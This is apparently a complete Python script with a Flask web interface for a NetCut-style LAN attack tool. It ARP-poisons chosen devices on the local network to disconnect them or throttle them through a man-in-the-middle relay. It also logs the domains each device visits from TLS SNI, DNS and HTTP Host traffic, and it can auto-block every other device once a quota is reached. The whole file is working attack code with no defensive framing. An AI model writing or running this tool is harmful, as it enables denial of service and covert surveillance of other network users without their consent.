#!/usr/bin/env python3
import os, sys, json, time, signal, threading, socket, subprocess, re, urllib.request, struct
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from collections import defaultdict

import netifaces
from scapy.all import *
from scapy.layers.l2 import Ether, ARP
from scapy.layers.inet import IP
from flask import Flask, jsonify, request, render_template

DATA_FILE = Path(__file__).parent / "devices.json"
app = Flask(__name__)

class Device:
    def __init__(self, ip, mac, hostname=None, vendor=None, custom_name=None):
        self.ip = ip; self.mac = mac
        self.hostname = hostname or "Unknown"; self.vendor = vendor or "Unknown"
        self.custom_name = custom_name or ""
        self.state = "Connected"
        self.spoof_stop = None; self.spoof_thread = None
        self.throttle_kbps = None
        self.watch = False
        self.first_seen = time.time()
        self.last_seen = time.time()

    def to_dict(self):
        dn = (self.custom_name or
              self.vendor if self.vendor != "Unknown" else
              self.hostname if self.hostname != "Unknown" else
              self.ip)
        return {"ip": self.ip, "mac": self.mac, "hostname": self.hostname,
                "vendor": self.vendor, "custom_name": self.custom_name,
                "state": self.state, "display_name": dn,
                "throttle_kbps": self.throttle_kbps,
                "watch": self.watch,
                "first_seen": self.first_seen, "last_seen": self.last_seen}

class TrafficMonitor:
    def __init__(self):
        self.traffic = defaultdict(int)
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        self.thread = None

    def packet_handler(self, pkt):
        if IP in pkt:
            size = len(pkt)
            with self.lock:
                self.traffic[pkt[IP].src] += size
                self.traffic[pkt[IP].dst] += size

    def start(self, interface):
        self.traffic.clear(); self.stop_event.clear()
        self.thread = threading.Thread(target=self._run, args=(interface,), daemon=True)
        self.thread.start()

    def _run(self, interface):
        sniff(iface=interface, prn=self.packet_handler, store=0,
              stop_filter=lambda p: self.stop_event.is_set())

    def stop(self): self.stop_event.set()
    def get_traffic(self):
        with self.lock:
            return {ip: round(b/1024, 1) for ip, b in self.traffic.items()}

    def snapshot_bytes(self):
        with self.lock:
            return dict(self.traffic)

    def total_bytes(self):
        with self.lock:
            return sum(self.traffic.values())

class DomainWatcher:
    """Passive watcher that records which domains each device visits.

    Uses three signals visible on the local segment:
      - TLS ClientHello SNI (dst port 443)
      - DNS queries (port 53)
      - HTTP request Host header (dst port 80)
    Notice: this relies on the traffic crossing our NIC (normal for any
    ARP-inspecting client on the same segment / when MITM is active).
    """
    MAX_PER_IP = 60
    WINDOW = 60 * 60  # forget domains idle for > 1 hour

    def __init__(self):
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        self.thread = None
        self.domains = defaultdict(dict)  # ip -> {domain: {count, last}}

    def _parse_sni(self, data):
        try:
            if data[0] != 0x16: return None
            if data[5] != 0x01: return None
            pos = 5 + 4      # skip handshake type+len
            pos += 2         # TLS version
            pos += 32        # random
            sid_len = data[pos]; pos += 1 + sid_len
            cs_len = int.from_bytes(data[pos:pos+2], 'big'); pos += 2 + cs_len
            cm_len = data[pos]; pos += 1 + cm_len
            ext_total = int.from_bytes(data[pos:pos+2], 'big'); pos += 2
            end = pos + ext_total
            while pos + 4 <= end:
                etype = int.from_bytes(data[pos:pos+2], 'big')
                elen = int.from_bytes(data[pos+2:pos+4], 'big')
                pos += 4
                if etype == 0:  # server_name
                    npos = pos + 2
                    while npos + 3 < pos + elen:
                        ntype = data[npos]; nlen = int.from_bytes(data[npos+1:npos+3], 'big'); npos += 3
                        if ntype == 0:
                            name = data[npos:npos+nlen].decode('utf-8', 'ignore')
                            return name
                        npos += nlen
                    return None
                pos += elen
        except Exception:
            return None
        return None

    def sniff_http_host(self, data):
        try:
            z = data.split(b"\r\n")
            if not z: return None
            if not (z[0].startswith(b"GET ") or z[0].startswith(b"POST ") or
                    z[0].startswith(b"HEAD ") or z[0].startswith(b"PUT ") or
                    z[0].startswith(b"DELETE ")):
                return None
            for line in z[1:]:
                if line.lower().startswith(b"host:"):
                    host = line[5:].strip().decode('utf-8', 'ignore')
                    return host.split(':')[0] if ':' in host else host
        except Exception:
            return None
        return None

    def record(self, ip, domain):
        if not domain or len(domain) > 253: return
        now = time.time()
        with self.lock:
            d = self.domains[ip]
            if domain in d:
                d[domain]["count"] += 1
                d[domain]["last"] = now
            else:
                if len(d) >= self.MAX_PER_IP:
                    oldest = min(d.items(), key=lambda kv: kv[1]["last"])
                    del d[oldest[0]]
                d[domain] = {"count": 1, "last": now}

    def packet_handler(self, pkt):
        try:
            if IP not in pkt: return
            ip = pkt[IP]
            if TCP in pkt:
                tcp = pkt[TCP]
                if Raw in tcp:
                    raw = bytes(tcp[Raw].load)
                    if tcp.dport == 443 and raw:
                        d = self._parse_sni(raw)
                        if d: self.record(ip.src, d)
                    elif tcp.dport == 80 and raw:
                        h = self.sniff_http_host(raw)
                        if h: self.record(ip.src, h)
            if DNS in pkt and pkt[DNS].qd:
                try:
                    name = pkt[DNS].qd.qname.decode('utf-8', 'ignore').rstrip('.')
                except Exception:
                    name = None
                if name: self.record(ip.src, name)
        except Exception:
            pass

    def start(self, interface):
        self.stop_event.clear()
        self.thread = threading.Thread(target=self._run, args=(interface,), daemon=True)
        self.thread.start()

    def _run(self, interface):
        sniff(iface=interface, prn=self.packet_handler, store=0,
              stop_filter=lambda p: self.stop_event.is_set())

    def set_stop(self):
        self.stop_event.set()

    def get_domains(self, since=None):
        now = time.time()
        with self.lock:
            out = {}
            for ip, doms in self.domains.items():
                keep = {d: v for d, v in doms.items()
                        if not since or v["last"] >= since}
                keep = {d: v for d, v in keep.items() if now - v["last"] < self.WINDOW}
                if keep: out[ip] = keep
            return out

class QuotaTracker:
    """Monthly internet quota tracking + auto-throttle / auto-block.

    Samples total traffic flowing through the interface, accumulates the
    delta into a monthly counter, and decides when to start throttling or
    blocking all non-self devices based on thresholds.
    """
    def __init__(self):
        self.lock = threading.Lock()
        self.enabled = False
        self.limit_gb = 0.0
        self.throttle_kbps = 300
        self.throttle_pct = 80.0
        self.block_pct = 100.0
        self.used_bytes = 0.0
        self.month_start = time.time()
        self.prev_snapshot = {}
        self.last_pct = 0.0
        self.mode = None
        self.throttled_ips = set()
        self.blocked_ips = set()

    def load(self, cfg):
        if not isinstance(cfg, dict): return
        with self.lock:
            self.enabled = bool(cfg.get("enabled", self.enabled))
            self.limit_gb = float(cfg.get("limit_gb", self.limit_gb))
            self.throttle_kbps = int(cfg.get("throttle_kbps", self.throttle_kbps))
            self.throttle_pct = float(cfg.get("throttle_pct", self.throttle_pct))
            self.block_pct = float(cfg.get("block_pct", self.block_pct))
            self.used_bytes = float(cfg.get("used_bytes", self.used_bytes))
            self.month_start = float(cfg.get("month_start", self.month_start))

    def to_dict(self):
        with self.lock:
            return {"enabled": self.enabled, "limit_gb": self.limit_gb,
                    "throttle_kbps": self.throttle_kbps,
                    "throttle_pct": self.throttle_pct,
                    "block_pct": self.block_pct,
                    "used_mb": round(self.used_bytes / 1048576, 1),
                    "used_pct": round(self.percent(), 1),
                    "mode": self.mode,
                    "month_start": self.month_start}

    def reset(self):
        with self.lock:
            self.used_bytes = 0.0
            self.month_start = time.time()
            self.throttled_ips.clear()
            self.blocked_ips.clear()
            self.mode = None

    def add_usage(self, delta):
        if delta <= 0: return
        with self.lock:
            self.used_bytes += delta

    def percent(self):
        if not self.limit_gb or self.limit_gb <= 0:
            return 0.0
        return (self.used_bytes / (self.limit_gb * 1e9)) * 100.0

    def state(self):
        with self.lock:
            return {"enabled": self.enabled, "limit_gb": self.limit_gb,
                    "throttle_kbps": self.throttle_kbps,
                    "throttle_pct": self.throttle_pct,
                    "block_pct": self.block_pct,
                    "used_bytes": self.used_bytes,
                    "month_start": self.month_start}

class TokenBucketForwarder:
    """Real per-device bandwidth shaping (MITM relay).

    The target device is ARP-poisoned so its traffic to/from the gateway
    physically crosses our NIC. This class sniffs those frames, enforces a
    token bucket per target (dropping frames that exceed the configured
    bit-rate), and re-transmits the allowed frames out the same NIC on the
    correct leg. Watch-only targets are relayed at full speed without shaping.

    IMPORTANT: the relaying socket is opened ONCE and reused, because
    scapy's sendp() opens and closes a raw socket on every call which
    collapses throughput (devices look "cut off" at high bit-rates).
    """
    def __init__(self):
        self._targets = {}
        self.lock = threading.Lock()
        self.thread = None
        self.drain_thread = None
        self.stop_event = threading.Event()
        self.gateway_ip = None; self.gateway_mac = None
        self.our_mac = None; self.our_ip = None; self.interface = None
        self.sock = None
        self.stats = {"enqueued": 0, "sent": 0, "sent_bytes": 0, "dropped": 0,
                      "errors": 0, "last_error": None, "sock_open": False}

    def configure(self, gateway_ip=None, gateway_mac=None, our_mac=None, our_ip=None, interface=None):
        with self.lock:
            if gateway_ip is not None: self.gateway_ip = gateway_ip
            if gateway_mac is not None: self.gateway_mac = gateway_mac
            if our_mac is not None: self.our_mac = our_mac
            if our_ip is not None: self.our_ip = our_ip
            if interface is not None: self.interface = interface

    def set_target(self, ip, kbps, mac=None, watch=False):
        from collections import deque
        with self.lock:
            if kbps and kbps > 0:
                self._targets[ip] = {"kbps": kbps, "mac": mac,
                                     "watch": bool(watch),
                                     "q": deque(), "qbytes": 0,
                                     "tokens": 0.0, "last": time.time(),
                                     "bw_bytes": 0, "bw_last": time.time()}
            else:
                self._targets.pop(ip, None)

    def _entry(self, ip):
        with self.lock:
            return self._targets.get(ip)

    def active(self):
        with self.lock:
            return {ip: t["kbps"] for ip, t in self._targets.items()}

    def start(self):
        self.stop_event.clear()
        if not (self.thread and self.thread.is_alive()):
            self.thread = threading.Thread(target=self._run, args=(self.interface,), daemon=True)
            self.thread.start()
        if not (self.drain_thread and self.drain_thread.is_alive()):
            self.drain_thread = threading.Thread(target=self._drain, daemon=True)
            self.drain_thread.start()

    def set_stop(self):
        self.stop_event.set()

    def clear(self):
        with self.lock:
            self._targets.clear()

    def _open_sock(self):
        if self.interface:
            try:
                self.sock = open_l2socket(self.interface)
                self.stats["sock_open"] = True
                return
            except Exception as ex:
                self.stats["sock_open"] = False
                self.stats["last_error"] = repr(ex)
        self.sock = None

    def _run(self, interface):
        self._open_sock()
        sniff(iface=interface, prn=self._on_packet, store=0,
              stop_filter=lambda p: self.stop_event.is_set())

    def _send(self, frame_bytes):
        try:
            if self.sock is None:
                self._open_sock()
            if self.sock is not None:
                self.sock.send(frame_bytes)
                self.stats["sent"] += 1
                self.stats["sent_bytes"] += len(frame_bytes)
                return True
        except Exception as ex:
            self.stats["errors"] += 1
            self.stats["last_error"] = repr(ex)
            self._open_sock()
        return False

    def _drain(self):
        MAX_Q = 1024 * 1024  # 1 MB buffer per target allows bursts without collapse
        while not self.stop_event.is_set():
            now = time.time()
            did = False
            targets = None
            with self.lock:
                targets = list(self._targets.values())
            for t in targets:
                if t["watch"]:
                    q = t["q"]
                    while q:
                        b = q.popleft()
                        t["qbytes"] -= len(b)
                        if not self._send(b): self.stats["dropped"] += 1
                        if self.stop_event.is_set(): return
                        did = True
                    continue
                rate = (t["kbps"] * 1000) / 8.0
                t["tokens"] = min(t["tokens"] + (now - t["last"]) * rate, rate * 1.0)
                t["last"] = now
                q = t["q"]
                while q and t["tokens"] >= len(q[0]):
                    b = q.popleft()
                    t["qbytes"] -= len(b)
                    t["tokens"] -= len(b)
                    t["bw_bytes"] += len(b)
                    t["bw_last"] = now
                    if not self._send(b): self.stats["dropped"] += 1
                    did = True
                    if self.stop_event.is_set(): return
                if t["qbytes"] > MAX_Q:
                    excess = t["qbytes"] - MAX_Q
                    while q and excess > 0:
                        b = q.popleft()
                        t["qbytes"] -= len(b)
                        excess -= len(b)
                        self.stats["dropped"] += 1
                        if self.stop_event.is_set(): return
            if not did:
                time.sleep(0.002)

    def _on_packet(self, pkt):
        try:
            if Ether not in pkt or IP not in pkt: return
            e = pkt[Ether]; ip = pkt[IP]
            if e.src == self.our_mac: return
            if self.gateway_ip is None: return
            gw = self.gateway_ip
            src, dst = ip.src, ip.dst
            entry = None
            if src == gw:
                entry = self._entry(dst)
            elif dst == gw and src == self.our_ip:
                return
            elif dst == gw:
                entry = self._entry(src)
            else:
                entry = self._entry(src) or self._entry(dst) or None
            if entry is None: return
            if src == gw:
                out = Ether(dst=entry["mac"], src=self.our_mac) / pkt[IP]
            else:
                out = Ether(dst=self.gateway_mac, src=self.our_mac) / pkt[IP]
            with self.lock:
                entry["q"].append(bytes(out))
                entry["qbytes"] += len(out)
                self.stats["enqueued"] += 1
        except Exception as ex:
            self.stats["errors"] += 1

    def report(self):
        now = time.time()
        with self.lock:
            targets = {}
            for ip, t in self._targets.items():
                span = now - t["bw_last"]
                live = round((t["bw_bytes"] * 8) / span / 1e6, 2) if span > 0 else 0.0
                t["bw_bytes"] = 0
                t["bw_last"] = now
                targets[ip] = {"kbps": t["kbps"], "mac": t["mac"],
                               "watch": t["watch"],
                               "qbytes": t["qbytes"],
                               "queued_frames": len(t["q"]),
                               "live_mbps": live}
            return {"targets": targets, "stats": dict(self.stats)}

def open_l2socket(iface):
    from scapy.config import conf
    return conf.L2socket(iface=iface)

class NetCutController:
    def __init__(self):
        self.interface = None; self.ip = None; self._iface_idx = None
        self.gateway_ip = None; self.gateway_mac = None
        self.devices = []; self.saved_data = self.load_saved()
        self.scanning = False; self.scan_progress = 0
        self.traffic = TrafficMonitor()
        self.forwarder = TokenBucketForwarder()
        self.watcher = DomainWatcher()
        self.quota = QuotaTracker()
        self.quota.load(self.saved_data.get('quota'))
        self._last_traffic_total = 0
        self.auto_scan_stop = threading.Event()
        self.auto_scan_thread = None
        self.our_mac = None
        self.our_ip = None

    def save_quota(self):
        self.saved_data['quota'] = self.quota.state()
        with open(DATA_FILE, 'w') as f: json.dump(self.saved_data, f, indent=2)

    def load_saved(self):
        if DATA_FILE.exists():
            try:
                with open(DATA_FILE) as f: return json.load(f)
            except: return {}
        return {}

    def save_device(self, mac, data):
        entry = self.saved_data.get(mac, {})
        entry.update(data)
        self.saved_data[mac] = entry
        with open(DATA_FILE, 'w') as f: json.dump(self.saved_data, f, indent=2)

    def get_vendor(self, mac):
        saved = self.saved_data.get(mac, {})
        if saved.get("vendor"):
            return saved["vendor"]
        try:
            req = urllib.request.Request(
                f"https://api.macvendors.com/{mac}",
                headers={'User-Agent': 'Python-urllib/3.0'})
            with urllib.request.urlopen(req, timeout=3) as r:
                vendor = r.read().decode().strip()
                if vendor:
                    self.save_device(mac, {"vendor": vendor})
                    return vendor
        except: pass
        return None

    def discover_interfaces(self):
        if os.name == 'nt':
            from scapy.arch.windows import get_windows_if_list
            iface_list = get_windows_if_list()
        else: iface_list = []
        available = []
        if os.name == 'nt':
            for iface in iface_list:
                name = iface.get('name', '')
                ips = [ip for ip in iface.get('ips', []) if '.' in ip and not ip.startswith('169.254')]
                desc = iface.get('description', '')
                if ips and name and not any(x in desc for x in ['WAN Miniport', 'Kernel Debug', 'VPN', 'Loopback', 'Teredo', '6to4', 'IP-HTTPS']):
                    available.append((name, ips[0], desc, iface.get('index')))
        else:
            for i in netifaces.interfaces():
                if i == 'lo': continue
                addrs = netifaces.ifaddresses(i)
                if netifaces.AF_INET in addrs:
                    ip = addrs[netifaces.AF_INET][0]['addr']
                    if not ip.startswith('169.254'): available.append((i, ip, i, None))
        if not available: return None, "No usable interfaces."
        gateways = netifaces.gateways()
        gw = gateways['default'][netifaces.AF_INET][0] if 'default' in gateways and netifaces.AF_INET in gateways['default'] else None
        sel = None
        if gw: sel = next((x for x in available if x[1] == gw), None)
        if not sel and gw:
            pfx = '.'.join(gw.split('.')[:3])
            sel = next((x for x in available if x[1].startswith(pfx)), None)
        if not sel: sel = next((x for x in available if 'Ethernet' in x[0] or 'Wi-Fi' in x[0] or 'eth' in x[0]), None)
        if not sel: sel = available[0]
        self.interface, self.ip, _, self._iface_idx = sel
        self.our_mac = get_if_hwaddr(self.interface)
        self.our_ip = self.ip
        self.forwarder.configure(interface=self.interface, gateway_ip=gw, our_mac=self.our_mac, our_ip=self.ip)
        if not gw: return None, "No default gateway."
        self.gateway_ip = gw
        return True, None

    def get_device_info(self, ip, mac):
        hostname = None
        try:
            hn = socket.gethostbyaddr(ip); hostname = hn[0]
        except: pass
        vendor = self.get_vendor(mac)
        return hostname, vendor

    def arp_scan(self, passes=3):
        conf.verb = 0
        target = self.gateway_ip.rsplit('.', 1)[0] + ".1/24"
        req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target)
        result = {}
        for _ in range(passes):
            try:
                ans, _ = srp(req, timeout=3, retry=1, verbose=False)
            except Exception:
                continue
            for s, r in ans:
                ip, mac = r.psrc, r.hwsrc
                if ip == self.ip or mac == self.our_mac:
                    continue
                if mac not in result:
                    result[mac] = ip
                if ip == self.gateway_ip:
                    self.gateway_mac = mac
        return result

    def scan_network(self):
        self.scanning = True; self.scan_progress = 0
        for d in self.devices:
            if d.spoof_stop: d.spoof_stop.set()
            d.spoof_stop = None; d.spoof_thread = None

        self.scan_progress = 10
        found = self.arp_scan(passes=3)
        self.scan_progress = 60
        self.forwarder.configure(gateway_mac=self.gateway_mac)
        self.merge_scan_results(found)
        for d in self.devices:
            if d.state in ("Disconnected", "Throttled"):
                self._start_spoof(d)
        self.devices.sort(key=lambda x: x.ip)
        self.scan_progress = 100
        self.traffic.stop(); self.traffic.start(self.interface)
        self.watcher.set_stop(); self.watcher.start(self.interface)
        self.forwarder.start()
        self.scanning = False
        return self.devices

    def merge_scan_results(self, found):
        now = time.time()
        by_mac = {d.mac: d for d in self.devices}
        new_macs = [mac for mac in found if mac not in by_mac]

        if new_macs:
            resolved = {}
            with ThreadPoolExecutor(max_workers=4) as ex:
                futures = {mac: ex.submit(self.get_device_info, found[mac], mac) for mac in new_macs}
                for mac, fut in futures.items():
                    try:
                        resolved[mac] = fut.result()
                    except Exception:
                        resolved[mac] = (None, None)
            for mac in new_macs:
                hostname, vendor = resolved.get(mac, (None, None))
                saved = self.saved_data.get(mac, {})
                dev = Device(found[mac], mac, hostname, vendor, saved.get("custom_name", ""))
                if found[mac] == self.gateway_ip:
                    dev.state = "Router (Connected)"
                    self.gateway_mac = mac
                elif saved.get("state") == "Disconnected":
                    dev.state = "Disconnected"
                elif saved.get("state") == "Throttled":
                    dev.state = "Throttled"
                    dev.throttle_kbps = saved.get("throttle_kbps", 256)
                    self.forwarder.set_target(found[mac], dev.throttle_kbps, mac)
                self.devices.append(dev)

        for mac, ip in found.items():
            dev = by_mac.get(mac)
            if not dev:
                continue
            dev.ip = ip
            dev.last_seen = now
            if dev.state == "Offline":
                dev.state = "Connected"
            if dev.state == "Throttled":
                self.forwarder.set_target(dev.ip, dev.throttle_kbps, dev.mac)
            if dev.state == "Disconnected":
                self._start_spoof(dev)

        for d in self.devices:
            if d.mac in found or d.ip == self.gateway_ip:
                continue
            if d.state != "Disconnected":
                d.state = "Offline"

    def _start_spoof(self, dev):
        if dev.spoof_stop: return
        dev.spoof_stop = threading.Event()
        dev.spoof_thread = threading.Thread(target=self._spoof_loop, args=(dev,), daemon=True)
        dev.spoof_thread.start()

    def _stop_spoof(self, dev):
        if dev.spoof_stop: dev.spoof_stop.set()
        dev.spoof_stop = None; dev.spoof_thread = None

    def _spoof_loop(self, dev):
        protect = Ether(dst=self.our_mac) / ARP(op=2, pdst=self.gateway_ip, hwdst=self.our_mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac)
        p1 = Ether(dst=dev.mac) / ARP(op=2, pdst=dev.ip, hwdst=dev.mac, psrc=self.gateway_ip, hwsrc=self.our_mac)
        p2 = Ether(dst=self.gateway_mac) / ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=dev.ip, hwsrc=self.our_mac)
        while dev.spoof_stop and not dev.spoof_stop.is_set():
            sendp(p1, iface=self.interface, verbose=False)
            sendp(p2, iface=self.interface, verbose=False)
            sendp(protect, iface=self.interface, verbose=False)
            time.sleep(2.5)

    def _restore(self, dev):
        p1 = Ether(dst=dev.mac) / ARP(op=2, pdst=dev.ip, hwdst=dev.mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac)
        p2 = Ether(dst=self.gateway_mac) / ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=dev.ip, hwsrc=dev.mac)
        sendp(p1, count=5, iface=self.interface, verbose=False)
        sendp(p2, count=5, iface=self.interface, verbose=False)

    def toggle_device(self, mac):
        for d in self.devices:
            if d.mac == mac:
                if d.ip == self.gateway_ip: return False, "Cannot touch gateway."
                if d.mac == self.our_mac: return False, "Cannot touch your own device."
                if d.state == "Connected":
                    d.state = "Disconnected"
                    d.watch = False
                    self._start_spoof(d)
                    self.save_device(mac, {"state": "Disconnected", "throttle_kbps": None})
                    return True, "Disconnected"
                elif d.state == "Disconnected":
                    self._stop_spoof(d)
                    self._restore(d)
                    d.state = "Connected"
                    self.save_device(mac, {"state": "Connected", "throttle_kbps": None})
                    return True, "Connected"
                else:
                    self._stop_spoof(d)
                    self._restore(d)
                    d.state = "Connected"
                    d.throttle_kbps = None
                    d.watch = False
                    self.forwarder.set_target(d.ip, 0)
                    self.save_device(mac, {"state": "Connected", "throttle_kbps": None})
                    return True, "Connected"
        return False, "Not found."

    def set_throttle(self, mac, kbps):
        for d in self.devices:
            if d.mac == mac:
                if d.ip == self.gateway_ip: return False, "Cannot touch gateway."
                if d.mac == self.our_mac: return False, "Cannot touch your own device."
                if not kbps or kbps <= 0:
                    self._stop_spoof(d)
                    self._restore(d)
                    d.state = "Connected"
                    d.throttle_kbps = None
                    d.watch = False
                    self.forwarder.set_target(d.ip, 0)
                    self.save_device(mac, {"state": "Connected", "throttle_kbps": None})
                    return True, "Restored"
                d.throttle_kbps = kbps
                d.state = "Throttled"
                d.watch = False
                self._start_spoof(d)
                self.forwarder.set_target(d.ip, kbps, d.mac)
                self.save_device(mac, {"state": "Throttled", "throttle_kbps": kbps})
                return True, f"Throttled to {kbps} kbps"
        return False, "Not found."

    def set_watch(self, mac, watch):
        for d in self.devices:
            if d.mac == mac:
                if d.ip == self.gateway_ip: return False, "Cannot touch gateway."
                if d.mac == self.our_mac: return False, "Cannot watch your own device."
                if watch:
                    d.watch = True
                    d.state = "Watched"
                    d.throttle_kbps = None
                    self._start_spoof(d)
                    self.forwarder.set_target(d.ip, 30000, d.mac, watch=True)
                    self.save_device(mac, {"state": "Watched", "throttle_kbps": None})
                    return True, "Watched"
                else:
                    d.watch = False
                    self._stop_spoof(d)
                    self._restore(d)
                    d.state = "Connected"
                    self.forwarder.set_target(d.ip, 0)
                    self.save_device(mac, {"state": "Connected", "throttle_kbps": None})
                    return True, "Connected"
        return False, "Not found."

    def rename_device(self, mac, name):
        for d in self.devices:
            if d.mac == mac:
                d.custom_name = name
                self.save_device(mac, {"custom_name": name})
                return True
        return False

    def throttle_all(self, kbps):
        count = 0
        for d in self.devices:
            if d.ip == self.gateway_ip or d.mac == self.our_mac:
                continue
            if d.state == "Offline":
                continue
            ok, _ = self.set_throttle(d.mac, kbps)
            if ok: count += 1
        return count

    def _accumulate_usage(self):
        try:
            total = self.traffic.total_bytes()
            delta = total - self._last_traffic_total
            self._last_traffic_total = total
            if delta > 0:
                self.quota.add_usage(delta)
        except Exception:
            pass

    def _enforce_quota(self):
        self._accumulate_usage()
        if not self.quota.enabled or self.quota.limit_gb <= 0:
            return
        pct = self.quota.percent()
        if pct >= self.quota.block_pct and self.quota.mode != "block":
            self.quota.mode = "block"
            for d in self.devices:
                if d.ip == self.gateway_ip or d.mac == self.our_mac:
                    continue
                if d.state != "Disconnected":
                    self.toggle_device(d.mac)
        elif pct >= self.quota.throttle_pct and self.quota.mode != "throttle":
            self.quota.mode = "throttle"
            self.throttle_all(self.quota.throttle_kbps)
        self.save_quota()

    def quota_info(self):
        self._accumulate_usage()
        return self.quota.to_dict()

    def restore_all(self):
        self.traffic.stop()
        self.forwarder.set_stop(); self.forwarder.clear()
        self.watcher.set_stop()
        if self.auto_scan_thread: self.auto_scan_stop.set()
        for d in self.devices:
            self._stop_spoof(d); self._restore(d)
            d.state = "Connected"
            d.throttle_kbps = None
            d.watch = False
            self.save_device(d.mac, {"state": "Connected", "throttle_kbps": None})

    def auto_scan_loop(self):
        while not self.auto_scan_stop.is_set():
            time.sleep(8)
            if self.auto_scan_stop.is_set(): break
            try:
                if self.scanning: continue
                found = self.arp_scan(passes=2)
                self.merge_scan_results(found)
                self.devices.sort(key=lambda x: x.ip)
                self._enforce_quota()
            except Exception:
                pass

    def start_auto_scan(self):
        self.auto_scan_stop.clear()
        self.auto_scan_thread = threading.Thread(target=self.auto_scan_loop, daemon=True)
        self.auto_scan_thread.start()

controller = NetCutController()

@app.route('/')
def index(): return render_template('index.html')

@app.route('/api/devices')
def get_devices():
    t = controller.traffic.get_traffic()
    return jsonify([{**d.to_dict(), "traffic_kb": t.get(d.ip, 0)} for d in controller.devices])

@app.route('/api/info')
def get_info():
    return jsonify({"ip": controller.ip, "gateway": controller.gateway_ip,
        "interface": controller.interface, "scanning": controller.scanning,
        "scan_progress": controller.scan_progress})

@app.route('/api/scan', methods=['POST'])
def scan():
    threading.Thread(target=controller.scan_network, daemon=True).start()
    return jsonify({"status": "started"})

@app.route('/api/toggle', methods=['POST'])
def toggle():
    data = request.get_json()
    ok, s = controller.toggle_device(data['mac'])
    return jsonify({"success": ok, "state": s})

@app.route('/api/throttle', methods=['POST'])
def throttle():
    data = request.get_json()
    ok, s = controller.set_throttle(data['mac'], int(data.get('kbps', 0)))
    return jsonify({"success": ok, "state": s})

@app.route('/api/watch', methods=['POST'])
def watch():
    data = request.get_json()
    ok, s = controller.set_watch(data['mac'], bool(data.get('watch', False)))
    return jsonify({"success": ok, "state": s})

@app.route('/api/rename', methods=['POST'])
def rename():
    data = request.get_json()
    ok = controller.rename_device(data['mac'], data['name'])
    return jsonify({"success": ok})

@app.route('/api/restore_all', methods=['POST'])
def restore_all():
    controller.restore_all(); return jsonify({"status": "ok"})

@app.route('/api/forwarder', methods=['GET'])
def forwarder_info():
    return jsonify(controller.forwarder.report())

@app.route('/api/throttle_all', methods=['POST'])
def throttle_all():
    data = request.get_json()
    count = controller.throttle_all(int(data.get('kbps', 0)))
    return jsonify({"status": "ok", "count": count})

@app.route('/api/quota', methods=['GET'])
def quota_get():
    return jsonify(controller.quota_info())

@app.route('/api/domains', methods=['GET'])
def domains_get():
    since = time.time() - int(request.args.get('minutes', 5) or 5) * 60
    return jsonify(controller.watcher.get_domains(since=since))

@app.route('/api/quota', methods=['POST'])
def quota_set():
    data = request.get_json()
    if "enabled" in data: controller.quota.enabled = bool(data["enabled"])
    if "limit_gb" in data: controller.quota.limit_gb = float(data["limit_gb"])
    if "throttle_kbps" in data: controller.quota.throttle_kbps = int(data["throttle_kbps"])
    if "throttle_pct" in data: controller.quota.throttle_pct = float(data["throttle_pct"])
    if "block_pct" in data: controller.quota.block_pct = float(data["block_pct"])
    if data.get("reset"):
        controller.quota.reset()
    controller.save_quota()
    controller._enforce_quota()
    return jsonify(controller.quota_info())

def cleanup():
    print("\nRestoring all..."); controller.restore_all()

if __name__ == '__main__':
    import ctypes
    if os.name == 'nt' and not ctypes.windll.shell32.IsUserAnAdmin():
        print("Run as Administrator."); sys.exit(1)
    elif os.name == 'posix' and os.geteuid() != 0:
        print("Run as root."); sys.exit(1)
    success, err = controller.discover_interfaces()
    if not success: print(f"Error: {err}"); sys.exit(1)
    print(f"Interface: {controller.interface} ({controller.ip})")
    print(f"Gateway: {controller.gateway_ip}")
    print("Scanning...")
    controller.scan_network()
    controller.start_auto_scan()
    print(f"Found {len(controller.devices)} device(s). Web UI: http://0.0.0.0:5000")
    signal.signal(signal.SIGINT, lambda s, f: (cleanup(), os._exit(0)))
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False, threaded=True)